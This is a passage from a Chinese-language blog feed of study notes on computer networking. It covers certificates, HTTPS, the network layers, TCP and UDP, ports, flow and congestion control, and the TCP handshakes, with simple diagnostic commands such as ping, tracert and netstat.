src="https://i.loli.net/2021/10/25/IKx5GfDq3wQLzdg.png" alt="查看源图像"></p><h6 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h6><p><img src="https://i.loli.net/2021/10/25/Dp2hQv1UfVyzSAw.jpg" alt="查看源图像"></p><p>证书</p><h6 id="数字证书是由CA机构颁发的证明（也就是问题中提及的CA证书），它包含了公钥、公钥拥有者名称、CA的数字签名、有效期、授权中心名称、证书序列号等信息。"><a href="#数字证书是由CA机构颁发的证明（也就是问题中提及的CA证书），它包含了公钥、公钥拥有者名称、CA的数字签名、有效期、授权中心名称、证书序列号等信息。" class="headerlink" title="数字证书是由CA机构颁发的证明（也就是问题中提及的CA证书），它包含了公钥、公钥拥有者名称、CA的数字签名、有效期、授权中心名称、证书序列号等信息。"></a>数字证书是由CA机构颁发的证明（也就是问题中提及的CA证书），它包含了公钥、公钥拥有者名称、CA的数字签名、有效期、授权中心名称、证书序列号等信息。</h6><h4 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h4><h6 id="HTTPS是在HTTP基础上使用SSL-TLS来加密报文，对窃听和中间人攻击提供合理的防护"><a href="#HTTPS是在HTTP基础上使用SSL-TLS来加密报文，对窃听和中间人攻击提供合理的防护" class="headerlink" title="HTTPS是在HTTP基础上使用SSL/TLS来加密报文，对窃听和中间人攻击提供合理的防护"></a>HTTPS是在HTTP基础上使用SSL/TLS来加密报文，对窃听和中间人攻击提供合理的防护</h6>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-网络分层(一)</title>
    <link href="/2021/10/13/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE(1)/"/>
    <url>/2021/10/13/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE(1)/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络-网络分层-一"><a href="#计算机网络-网络分层-一" class="headerlink" title="计算机网络-网络分层(一)"></a>计算机网络-网络分层(一)</h1><h2 id="网络互连模型"><a href="#网络互连模型" class="headerlink" title="网络互连模型"></a>网络互连模型</h2><span id="more"></span><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gcode">OSI参考模型<span class="hljs-comment">(open system reference model)</span> <span class="hljs-number">7</span>层<br><span class="hljs-number">7.</span>应用层<br><span class="hljs-number">6.</span>表示层<br><span class="hljs-number">5.</span>会话层<br><span class="hljs-number">4.</span>运输层<br><span class="hljs-number">3.</span>网络层<br><span class="hljs-number">2.</span>数据链路层<br><span class="hljs-number">1.</span>物理层<br><br>TCP/IP协议  <span class="hljs-number">4</span>层<br><span class="hljs-number">4.</span>应用层<br><span class="hljs-number">3.</span>运输层<br><span class="hljs-number">2.</span>网际层<br><span class="hljs-number">1.</span>网络接口层<br> <br>学习研究  <span class="hljs-number">5</span>层        请求过程        <br><span class="hljs-number">5.</span>应用层            <span class="hljs-number">5</span><span class="hljs-number">5</span>          报文/应用数据<br><span class="hljs-number">4.</span>运输层           <span class="hljs-number">45</span><span class="hljs-number">45</span>段<span class="hljs-comment">(segments)</span><br><span class="hljs-number">3.</span>网络层          <span class="hljs-number">345</span>   <span class="hljs-number">345</span>包<span class="hljs-comment">(packets)</span><br><span class="hljs-number">2.</span>数据链路层<span class="hljs-number">23452</span> <span class="hljs-number">23452</span>数据帧<br><span class="hljs-number">1.</span>物理层 <span class="hljs-number">123452</span>    <span class="hljs-number">123456</span>  比特流<br></code></pre></td></tr></table></figure><h2 id="一-物理层"><a href="#一-物理层" class="headerlink" title="一.物理层"></a>一.物理层</h2><h6 id="定义了接口标准，线缆速率，传输速率，传输方式"><a href="#定义了接口标准，线缆速率，传输速率，传输方式" class="headerlink" title="定义了接口标准，线缆速率，传输速率，传输方式"></a>定义了接口标准，线缆速率，传输速率，传输方式</h6><h6 id="1-数字信号"><a href="#1-数字信号" class="headerlink" title="1.数字信号:"></a>1.数字信号:</h6><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 离散的信号，不适合长距离传输<br><span class="hljs-bullet">2.</span> 抗干扰能力强<br></code></pre></td></tr></table></figure><h5 id="2-模拟信号"><a href="#2-模拟信号" class="headerlink" title="2.模拟信号:"></a>2.模拟信号:</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 连续的信号，适合长距离传输<br><span class="hljs-bullet">2.</span> 抗干扰能力差<br></code></pre></td></tr></table></figure><h5 id="3-信道"><a href="#3-信道" class="headerlink" title="3.信道:"></a>3.信道:</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">信息传输的通道<br>可分为<br><span class="hljs-bullet">1.</span> 单工通信<br><span class="hljs-bullet">2.</span> 半双工通信<br><span class="hljs-bullet">3.</span> 全双工通信<br></code></pre></td></tr></table></figure><h5 id="4-局域网通信模型"><a href="#4-局域网通信模型" class="headerlink" title="4.局域网通信模型"></a>4.局域网通信模型</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">PC -&gt;  数字信号/网线  -&gt;  交换机  数字信号/网线  -&gt;   PC<br></code></pre></td></tr></table></figure><h5 id="5-广域网通信模型"><a href="#5-广域网通信模型" class="headerlink" title="5.广域网通信模型"></a>5.广域网通信模型</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">PC-&gt;数字信号-&gt;调制解调器(光猫)-传输&gt;调制解调器-&gt;数字信号/网线-&gt;PC<br>PC-&gt;数字信号-&gt;光电转换器-传输&gt;光电转换器-&gt;数字信号/网线-&gt;PC<br></code></pre></td></tr></table></figure><h2 id="二-数据链路层"><a href="#二-数据链路层" class="headerlink" title="二.数据链路层"></a>二.数据链路层</h2><h5 id="1-链路"><a href="#1-链路" class="headerlink" title="1.链路:"></a>1.链路:</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">从一个节点到相邻接点的一段物理路线，中间没有其他交换节点<br></code></pre></td></tr></table></figure><h5 id="2-数据链路层的三个基本问题"><a href="#2-数据链路层的三个基本问题" class="headerlink" title="2.数据链路层的三个基本问题"></a>2.数据链路层的三个基本问题</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>封装成帧<br><span class="hljs-bullet">- </span>透明传输<br><span class="hljs-bullet">- </span>差错检验<br></code></pre></td></tr></table></figure><h2 id="三-网络层"><a href="#三-网络层" class="headerlink" title="三.网络层:"></a>三.网络层:</h2><h5 id="1-各层协议及数据包名称"><a href="#1-各层协议及数据包名称" class="headerlink" title="1.各层协议及数据包名称"></a>1.各层协议及数据包名称</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">协议所在最大层数<br>应用层       FTP<span class="hljs-regexp">/HTTP/</span>SMTP<span class="hljs-regexp">/DNS/</span>DHCP     报文/用户数据<br>运输层          TCP/UDP                    段<br>网络层          IP<span class="hljs-regexp">/ARP/</span>ICMP                包<br>数据链路层       CSMA<span class="hljs-regexp">/CD/</span>PPP                帧<br>物理层                                     比特流<br></code></pre></td></tr></table></figure><h6 id="2-TTL-time-to-live-生存时间"><a href="#2-TTL-time-to-live-生存时间" class="headerlink" title="2.TTL(time to live)生存时间"></a>2.TTL(time to live)生存时间</h6><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">每个路由器转发一次后TTL-<span class="hljs-number">1</span><br><br>观察ping命令后的TTL，能够推测出对方的操作系统，中间经过了多少个路由器<br><br>通过更改TTL值可得到经过的每一个路由器<br>ping baidu<span class="hljs-selector-class">.com</span> -<span class="hljs-selector-tag">i</span> <span class="hljs-number">1</span> <br>ping baidu<span class="hljs-selector-class">.com</span> -<span class="hljs-selector-tag">i</span> <span class="hljs-number">2</span><br>ping baidu<span class="hljs-selector-class">.com</span> -<span class="hljs-selector-tag">i</span> <span class="hljs-number">3</span><br><br>tracert baidu.com<br></code></pre></td></tr></table></figure><h2 id="四-传输层-transport"><a href="#四-传输层-transport" class="headerlink" title="四.传输层(transport)"></a>四.传输层(transport)</h2><h6 id="TCP-transmission-control-protocol-传输控制协议"><a href="#TCP-transmission-control-protocol-传输控制协议" class="headerlink" title="TCP(transmission control protocol),传输控制协议"></a>TCP(transmission control protocol),传输控制协议</h6><h6 id="UDP-User-datagram-protocol-，用户数据报协议"><a href="#UDP-User-datagram-protocol-，用户数据报协议" class="headerlink" title="UDP(User datagram protocol)，用户数据报协议"></a>UDP(User datagram protocol)，用户数据报协议</h6><h5 id="1-TCP-UDP区别"><a href="#1-TCP-UDP区别" class="headerlink" title="1.TCP/UDP区别"></a>1.TCP/UDP区别</h5><table><thead><tr><th></th><th align="center">TCP</th><th>UDP</th></tr></thead><tbody><tr><td>连接性</td><td align="center">面向连接</td><td>无连接</td></tr><tr><td>可靠性</td><td align="center">可靠传输，不丢包</td><td>不可靠传输，尽最大努力交付可能丢包</td></tr><tr><td>首部占用空间</td><td align="center">大</td><td>小</td></tr><tr><td>传输速率</td><td align="center">慢</td><td>快</td></tr><tr><td>资源消耗</td><td align="center">大</td><td>小</td></tr><tr><td>应用场景</td><td align="center">浏览器/文件传输/邮件</td><td>音视频通话/直播(实时的 )</td></tr><tr><td>应用层协议</td><td align="center">HTTP/HTTPS/FTP/SMTP/DNS</td><td>DNS</td></tr><tr><td></td><td align="center"></td><td></td></tr></tbody></table><h6 id="2-常见协议默认使用端口"><a href="#2-常见协议默认使用端口" class="headerlink" title="2.常见协议默认使用端口"></a>2.常见协议默认使用端口</h6><table><thead><tr><th>协议</th><th align="left">默认端口号</th></tr></thead><tbody><tr><td>HTTP</td><td align="left">TCP+80</td></tr><tr><td>HTTPS</td><td align="left">TCP+443</td></tr><tr><td>FTP</td><td align="left">TCP+21</td></tr><tr><td>MySQL</td><td align="left">TCP+3306</td></tr><tr><td>DNS</td><td align="left">TCP/UDP+53</td></tr><tr><td>SMTP</td><td align="left">TCP+25</td></tr><tr><td>POP3</td><td align="left">TCP+110</td></tr></tbody></table><h6 id="关于端口的常见命令行"><a href="#关于端口的常见命令行" class="headerlink" title="关于端口的常见命令行"></a>关于端口的常见命令行</h6><ol><li>netstat-an:查看被占用的端口</li><li>netstat-anb: 查看被占用的端口，占用端口的程序</li><li>telnet 主机 端口:查看是否可以访问某个主机的某个端口</li></ol><h6 id="3-UDP"><a href="#3-UDP" class="headerlink" title="3.UDP"></a>3.UDP</h6><ol><li><h6 id="UDP是无连接的，减少了建立和释放连接的开销"><a href="#UDP是无连接的，减少了建立和释放连接的开销" class="headerlink" title="UDP是无连接的，减少了建立和释放连接的开销"></a>UDP是无连接的，减少了建立和释放连接的开销</h6></li><li><h6 id="UDP尽对大努力交付，不保证可靠交付"><a href="#UDP尽对大努力交付，不保证可靠交付" class="headerlink" title="UDP尽对大努力交付，不保证可靠交付"></a>UDP尽对大努力交付，不保证可靠交付</h6></li><li><h6 id="首部只有8个字节-源端口号-目的端口号-UDP长度-UDP校验和"><a href="#首部只有8个字节-源端口号-目的端口号-UDP长度-UDP校验和" class="headerlink" title="首部只有8个字节(源端口号+目的端口号+UDP长度+UDP校验和)"></a>首部只有8个字节(源端口号+目的端口号+UDP长度+UDP校验和)</h6><p><img src="https://i.loli.net/2021/10/23/cMTYhxFVEeBpLuC.png" alt="查看源图像"></p><p><img src="https://i.loli.net/2021/10/23/wZm1c5PM87GEFUI.png" alt="image-20211019103410401"></p></li></ol><h6 id="4-TCP"><a href="#4-TCP" class="headerlink" title="4.TCP"></a>4.TCP</h6><h6 id="1-TCP首部"><a href="#1-TCP首部" class="headerlink" title="1)TCP首部"></a>1)TCP首部</h6><p><img src="https://i.loli.net/2021/10/23/stnLkhvoQuUCfzO.jpg"></p><p><img src="https://i.loli.net/2021/10/23/nsL5C7jx3ZBuGTM.png" alt="image-20211019104752118"></p><ol><li><h6 id="标志位"><a href="#标志位" class="headerlink" title="标志位"></a>标志位</h6></li></ol><p><img src="https://i.loli.net/2021/10/23/AhWUQlDipOZ4Ruy.png" alt="image-20211019110015591"></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-number">1.</span><span class="hljs-constructor">URG(<span class="hljs-params">urgent</span>)</span>：作用与发送端，当URG=<span class="hljs-number">1</span>时，说明此数据段需要立即发送，此时发送端不考虑发送顺序问题，立刻将此数据包发送出去<br><span class="hljs-number">2.</span><span class="hljs-constructor">ACK(ACKnowledgment)</span>：当ACK=<span class="hljs-number">1</span>时，确认号才有作用<br><span class="hljs-number">3.</span><span class="hljs-constructor">PSH(<span class="hljs-params">push</span>)</span>：与URG相对，此作用于接收端，令接收端首先接受此数据<br><span class="hljs-number">4.</span><span class="hljs-constructor">RST(<span class="hljs-params">reset</span>)</span>：当TCP连接出现严重错误时，RST=<span class="hljs-number">1</span>，说明需要释放连接<br><span class="hljs-number">5.</span><span class="hljs-constructor">SYN(<span class="hljs-params">synchronous</span>)</span>：只有建立请求和确认请求的两个数据包中，SYN=<span class="hljs-number">1</span>，即TCP三次握手的前两次握手<br><span class="hljs-number">6.</span><span class="hljs-constructor">FIN(<span class="hljs-params">finish</span>)</span>：结束TCP连接<br></code></pre></td></tr></table></figure><ol start="2"><li><h6 id="序号"><a href="#序号" class="headerlink" title="序号"></a>序号</h6><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs subunit">首先，在传输过程中每一个字节都有一个编号<br><br>在建立连接后，首部的序号代表传给对方的TCP数据部分第一个字节的标号<br><br>比如，TCP传输数据内容为(0<span class="hljs-string">-99</span>,100<span class="hljs-string">-199</span>)过大，需要分2次传输<br>则分段传输TCP数据包的序号为0 100;<br>这样可以保证数据有序<br></code></pre></td></tr></table></figure></li><li><h6 id="确认号"><a href="#确认号" class="headerlink" title="确认号"></a>确认号</h6><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">在建立连接后，确定号代表:期望对方下一次传过来的TCP数据部分的第一个字节的编号 </span><br></code></pre></td></tr></table></figure><h6 id="4-数据偏移"><a href="#4-数据偏移" class="headerlink" title="4.数据偏移"></a>4.数据偏移</h6><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">占四位，取值范围<span class="hljs-number">0</span>x0<span class="hljs-number">101~0x1111</span><br>乘以<span class="hljs-number">4</span>即是首部长度(<span class="hljs-number">20</span>~<span class="hljs-number">60</span>字节)<br></code></pre></td></tr></table></figure><h6 id="5-保留位"><a href="#5-保留位" class="headerlink" title="5.保留位"></a>5.保留位</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">占6位，目前全为0，以后用<br></code></pre></td></tr></table></figure></li></ol><h5 id="TCP要点"><a href="#TCP要点" class="headerlink" title="TCP要点"></a>TCP要点</h5><ol><li><h6 id="可靠传输"><a href="#可靠传输" class="headerlink" title="可靠传输"></a>可靠传输</h6><ol><li><h6 id="停止等待ARQ协议-automatic-repeat-request-自动重传请求-效率低"><a href="#停止等待ARQ协议-automatic-repeat-request-自动重传请求-效率低" class="headerlink" title="停止等待ARQ协议(automatic repeat request),自动重传请求(效率低)"></a>停止等待ARQ协议(automatic repeat request),自动重传请求(效率低)</h6><p><img src="https://i.loli.net/2021/10/23/4H5ckhFzOiJsjdo.jpg" alt="查看源图像"></p><h6 id="b-连续ARQ协议-滑动窗口协议"><a href="#b-连续ARQ协议-滑动窗口协议" class="headerlink" title="b.连续ARQ协议+滑动窗口协议"></a>b.连续ARQ协议+滑动窗口协议</h6><p><img src="https://i.loli.net/2021/10/23/t3dHYCw6cZb9oD7.png" alt="查看源图像"></p><h6 id="c-SACK-选择性确认"><a href="#c-SACK-选择性确认" class="headerlink" title="c.SACK(选择性确认)"></a>c.SACK(选择性确认)</h6><p>在TCP通信中，如果发送序列的中间某个数据包丢失(123456中的5丢失)，TCP会重传后面的56数据包(包含已经发送过的6数据包)</p><h6 id="为改善以上情况，发展了SCAK技术，告诉发送方那些数据丢失，只重传丢失数据即可"><a href="#为改善以上情况，发展了SCAK技术，告诉发送方那些数据丢失，只重传丢失数据即可" class="headerlink" title="为改善以上情况，发展了SCAK技术，告诉发送方那些数据丢失，只重传丢失数据即可"></a>为改善以上情况，发展了SCAK技术，告诉发送方那些数据丢失，只重传丢失数据即可</h6></li></ol></li><li><h6 id="流量控制-根据传输情况动态调节窗口大小-点对点，两人之间接力传送包裹"><a href="#流量控制-根据传输情况动态调节窗口大小-点对点，两人之间接力传送包裹" class="headerlink" title="流量控制(根据传输情况动态调节窗口大小)(点对点，两人之间接力传送包裹)"></a>流量控制(根据传输情况动态调节窗口大小)(点对点，两人之间接力传送包裹)</h6><h6 id="原因"><a href="#原因" class="headerlink" title="原因:"></a>原因:</h6><h6 id="1-发送方和接收方都有一个缓存区，如果接收方的缓存区快满了，发送方还在发送大量数据，导致接收方只能将数据丢弃等待重传，极大地浪费了网络资源，所以要进行流量控制"><a href="#1-发送方和接收方都有一个缓存区，如果接收方的缓存区快满了，发送方还在发送大量数据，导致接收方只能将数据丢弃等待重传，极大地浪费了网络资源，所以要进行流量控制" class="headerlink" title="1)发送方和接收方都有一个缓存区，如果接收方的缓存区快满了，发送方还在发送大量数据，导致接收方只能将数据丢弃等待重传，极大地浪费了网络资源，所以要进行流量控制"></a>1)发送方和接收方都有一个缓存区，如果接收方的缓存区快满了，发送方还在发送大量数据，导致接收方只能将数据丢弃等待重传，极大地浪费了网络资源，所以要进行流量控制</h6><h6 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制:"></a>流量控制:</h6><h6 id="1-让发送方发送速率不要过快，让接收方来得及处理"><a href="#1-让发送方发送速率不要过快，让接收方来得及处理" class="headerlink" title="1)让发送方发送速率不要过快，让接收方来得及处理"></a>1)让发送方发送速率不要过快，让接收方来得及处理</h6><h6 id="控制原理"><a href="#控制原理" class="headerlink" title="控制原理:"></a>控制原理:</h6><p>1)调节确定报文中窗口字段来控制窗口大小</p><p>2)发送方的发送窗口大小不能超过接收方的窗口大小</p><p>3)当发送方的接收窗口大小为0时，发送方会停止发送数据</p><p>​        a)这种情况可能导致接收方无法知道接下来的窗口大小，因此会有一个定时器隔一段时间去询问最新窗口        大小</p></li><li><h6 id="拥塞控制-相对于流量控制来说是全局性的，交通需要大家维护"><a href="#拥塞控制-相对于流量控制来说是全局性的，交通需要大家维护" class="headerlink" title="拥塞控制(相对于流量控制来说是全局性的，交通需要大家维护)"></a>拥塞控制(相对于流量控制来说是全局性的，交通需要大家维护)</h6><p>1)数据传输过程中链路吞吐量与与阻塞程度关系</p><p><img src="https://i.loli.net/2021/10/23/lxJ6T3mNezPCWin.png" alt="查看源图像"></p><p>2)若无拥塞控制:随着吞吐量增大，会导致过度拥塞最终恶性循环导致死锁</p><p>3)拥塞控制:防止过多数据注入到链路中，避免链路过载</p><p>​        (发送窗口的最大值=min{接受窗口最大值，拥塞窗口最大值}</p><h6 id="a-慢启动"><a href="#a-慢启动" class="headerlink" title="a)慢启动"></a>a)慢启动</h6><p>​            cwnd(拥塞控制窗口)起初较小，随着发送过程中逐渐呈指数级增长</p><p>​            刚开始发的比较少，后面越来越多</p><h6 id="b-拥塞避免"><a href="#b-拥塞避免" class="headerlink" title="b)拥塞避免"></a>b)拥塞避免</h6><p>​            随着cwnd达到慢启动的阈值后，以线性方式增加</p><p>​            防止网络过早出现拥塞(未雨绸缪)</p><p>​            当网络出现拥塞，慢启动阈值减半，重新执行慢启动算法</p><p><img src="https://i.loli.net/2021/10/23/xE5MS7uDNCchdt2.jpg" alt="tcp 拥塞控制 的图像结果"></p><h6 id="c-快速重传"><a href="#c-快速重传" class="headerlink" title="c)快速重传"></a>c)快速重传</h6><p>​            收到一个失序的分组后立即发出三次重复确认，使发送方知道有分组没有到达，而不是等到自己发送数            据时才确认</p><h6 id="d-快速恢复"><a href="#d-快速恢复" class="headerlink" title="d)快速恢复"></a>d)快速恢复</h6><p>​            当发送方收到三个重复确认是，cwnd阈值减半，但不重新开始执行慢开始算法</p><p>​            直接从阈值开始执行拥塞避免(cwnd线性增长)</p></li><li><h6 id="连接管理"><a href="#连接管理" class="headerlink" title="连接管理"></a>连接管理</h6><h6 id="1-建立连接-三次握手"><a href="#1-建立连接-三次握手" class="headerlink" title="1)建立连接-三次握手"></a>1)建立连接-三次握手</h6><p>​            前两次握手</p><p>​            1.会互相交换一些信息，比如MSS，是否支持SACK，windows scale等(保存在头部的选项部分)</p><p>​            2.SYN都设置为1</p><p>​            3.数据部分的长度为0</p><p>​            4.TCP头部的长度一般是32个字节，固定头部20字节，选项部分12字节</p><p><img src="https://i.loli.net/2021/10/23/zASOXl96TwN5FUp.png" alt="查看源图像"></p><h6 id="2-释放连接-四次挥手"><a href="#2-释放连接-四次挥手" class="headerlink" title="2)释放连接-四次挥手"></a>2)释放连接-四次挥手</h6><p>​            任何⼀⽅都可以在数据传送结束后发出连接释放的通知，待对⽅确认后进⼊半关闭状态。当另⼀⽅也没            有数据再发送的时候，则发出连接释放通知，对⽅确认后就完全关闭了TCP连接。</p><p><img src="https://i.loli.net/2021/10/23/FTl5ALIxZnDHk3U.png" alt="查看源图像"></p></li></ol><h2 id="四-问题产生"><a href="#四-问题产生" class="headerlink" title="四.问题产生"></a>四.问题产生</h2><h6 id="1-为什么在传输层切分数据包，而不是网络层"><a href="#1-为什么在传输层切分数据包，而不是网络层" class="headerlink" title="1.为什么在传输层切分数据包，而不是网络层"></a>1.为什么在传输层切分数据包，而不是网络层</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">网络层和数据链路层没有重传功能<br><br>如果不在传输层分段，一旦数据丢失，整个传输侧层的数据都得重传<br><br>如果在传输层分了段，一旦数据丢失，只需要重传丢失的段即可<br></code></pre></td></tr></table></figure><h5 id="2-为什么TCP建立连接时3次握手，两次握手不行吗"><a href="#2-为什么TCP建立连接时3次握手，两次握手不行吗" class="headerlink" title="2.为什么TCP建立连接时3次握手，两次握手不行吗"></a>2.为什么TCP建立连接时3次握手，两次握手不行吗</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs clean">TCP三次连接<br><br>连接过程:连接请求 -&gt; 连接请求确认 -&gt;  确认<br><br>TCP两次连接的缺点<br><br>防止服务器端一直等待，浪费资源<br><br>如何建立连接只需要<span class="hljs-number">2</span>次握手，可能出现的情况<br><br><span class="hljs-number">1</span>)假设客户端发送的第一个连接请求报文段，由于网络延迟，在连接释放后的某个时间才到达服务器，<br><br>本来这已经是一个失效的请求，误让服务器以为客户端发出一个新的连接请求，而客户端不予理睬服务器。造成服务器一直等待。浪费资源。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-基础知识</title>
    <link href="/2021/10/07/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2021/10/07/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络-基础知识"><a href="#计算机网络-基础知识" class="headerlink" title="计算机网络-基础知识"></a>计算机网络-基础知识</h1><span id="more"></span><h6 id="为了满足各种需求，有各种各样的网络协议-HTTPS-SMTP-MQTT-RTMP"><a href="#为了满足各种需求，有各种各样的网络协议-HTTPS-SMTP-MQTT-RTMP" class="headerlink" title="为了满足各种需求，有各种各样的网络协议:(HTTPS  SMTP  MQTT  RTMP)"></a>为了满足各种需求，有各种各样的网络协议:(HTTPS  SMTP  MQTT  RTMP)</h6><h6 id="客户端-服务器-中间传输利用网络协议"><a href="#客户端-服务器-中间传输利用网络协议" class="headerlink" title="客户端-服务器(中间传输利用网络协议)"></a>客户端-服务器(中间传输利用网络协议)</h6><h6 id="C-C-的跨平台原理-针对不同平台使用对应的编译器生成不同的可执行文件"><a href="#C-C-的跨平台原理-针对不同平台使用对应的编译器生成不同的可执行文件" class="headerlink" title="C\C++的跨平台原理(针对不同平台使用对应的编译器生成不同的可执行文件)"></a>C\C++的跨平台原理(针对不同平台使用对应的编译器生成不同的<strong>可执行文件</strong>)</h6><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">代码<span class="hljs-function"><span class="hljs-params">(.c/.cpp)</span> -&gt;</span> PE格式 -&gt; 运行在windows<br>  -&gt; Mach-O格式 -&gt; 运行在Mac<br>  -&gt; ELF格式 -&gt; 运行在Linux<br></code></pre></td></tr></table></figure><h6 id="JAVA的跨平台原理-不同平台下利用JVM加载-class文件翻译成机器码后传给OS执行-一次编译，多次运行"><a href="#JAVA的跨平台原理-不同平台下利用JVM加载-class文件翻译成机器码后传给OS执行-一次编译，多次运行" class="headerlink" title="JAVA的跨平台原理(不同平台下利用JVM加载.class文件翻译成机器码后传给OS执行)   一次编译，多次运行"></a>JAVA的跨平台原理(不同平台下利用JVM加载.class文件翻译成机器码后传给OS执行)   一次编译，多次运行</h6><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">代码<span class="hljs-function"><span class="hljs-params">(.java)</span> -&gt;</span> 编译 -&gt; .<span class="hljs-keyword">class</span><span class="hljs-function"><span class="hljs-params">(字节码文件)</span> -&gt;</span> 不同平台安装JVM(可以理解为一个软件)后运行 -&gt; JVM加载<br></code></pre></td></tr></table></figure><h6 id="端口-连接客户端和服务器的枢纽-通过运行一个软件-占用某个端口-来实行监听功能-理解为营业厅的办事窗口"><a href="#端口-连接客户端和服务器的枢纽-通过运行一个软件-占用某个端口-来实行监听功能-理解为营业厅的办事窗口" class="headerlink" title="端口:连接客户端和服务器的枢纽,通过运行一个软件(占用某个端口)来实行监听功能(理解为营业厅的办事窗口)"></a>端口:连接客户端和服务器的枢纽,通过运行一个<strong>软件</strong>(<strong>占用某个端口</strong>)来实行监听功能(理解为营业厅的办事窗口)</h6><h6 id="TomCat软件-服务器下的服务器软件-管理服务器Java代码和端口之间的传输-类似于phpstudy"><a href="#TomCat软件-服务器下的服务器软件-管理服务器Java代码和端口之间的传输-类似于phpstudy" class="headerlink" title="TomCat软件:服务器下的服务器软件,管理服务器Java代码和端口之间的传输(类似于phpstudy)"></a>TomCat软件:服务器下的服务器软件,管理服务器Java代码和端口之间的传输(类似于phpstudy)</h6><h6 id="http-IP地址-端口号-项目"><a href="#http-IP地址-端口号-项目" class="headerlink" title="http://IP地址:端口号/项目"></a><a href="http://IP地址:端口号/项目">http://IP地址:端口号/项目</a></h6><h6 